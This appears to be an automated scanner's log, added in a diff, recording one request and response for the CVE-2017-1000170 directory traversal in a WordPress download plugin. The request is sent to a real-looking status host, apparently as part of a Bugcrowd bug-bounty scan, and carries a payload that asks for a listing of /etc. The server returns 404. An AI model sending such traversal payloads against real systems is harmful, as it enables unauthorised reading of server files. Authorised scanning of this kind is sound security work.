@@ -1,0 +1,36 @@
+[CVE-2017-1000170] Dumped HTTP request for https://status.techsolutions.bitpanda.com/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php
+
+
+POST /wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php HTTP/1.1
+Host: status.techsolutions.bitpanda.com
+User-Agent: Mozilla/5.0 (Fedora; Linux i686; rv:123.0) Gecko/20100101 Firefox/123.0
+Connection: close
+Content-Length: 28
+Accept: */*
+Accept-Language: en
+X-Bug-Bounty: Bugcrowd-eno@bugcrowdninja.com
+Accept-Encoding: gzip
+
+dir=%2Fetc%2F&onlyFiles=true
+[CVE-2017-1000170] Dumped HTTP response https://status.techsolutions.bitpanda.com/wp-content/plugins/delightful-downloads/assets/vendor/jqueryFileTree/connectors/jqueryFileTree.php
+
+HTTP/1.1 404 Not Found
+Connection: close
+Content-Length: 0
+Atl-Request-Id: 51eee9ec-46c1-4e7a-adb0-1326737bcdb1
+Atl-Traceid: 51eee9ec46c14e7aadb01326737bcdb1
+Date: Tue, 05 Aug 2025 12:53:15 GMT
+Nel: {"failure_fraction": 0.001, "include_subdomains": true, "max_age": 600, "report_to": "endpoint-1"}
+Report-To: {"endpoints": [{"url": "https://dz8aopenkvv6s.cloudfront.net"}], "group": "endpoint-1", "include_subdomains": true, "max_age": 600}
+Server: AtlassianEdge
+Server-Timing: atl-edge;dur=66,atl-edge-internal;dur=3,atl-edge-upstream;dur=63,atl-edge-pop;desc="aws-us-east-1"
+Strict-Transport-Security: max-age=63072000; preload
+Via: 1.1 4b0f0fc4315eea23426f6074a7254a8c.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: MIiSjyVVaOq49c469ugGhNCllFFleR2-tibLKgPPk9abxR6izBr_SA==
+X-Amz-Cf-Pop: IAD89-C2
+X-Cache: Error from cloudfront
+X-Content-Type-Options: nosniff
+X-Varnish: 155849560
+X-Xss-Protection: 1; mode=block
+
+
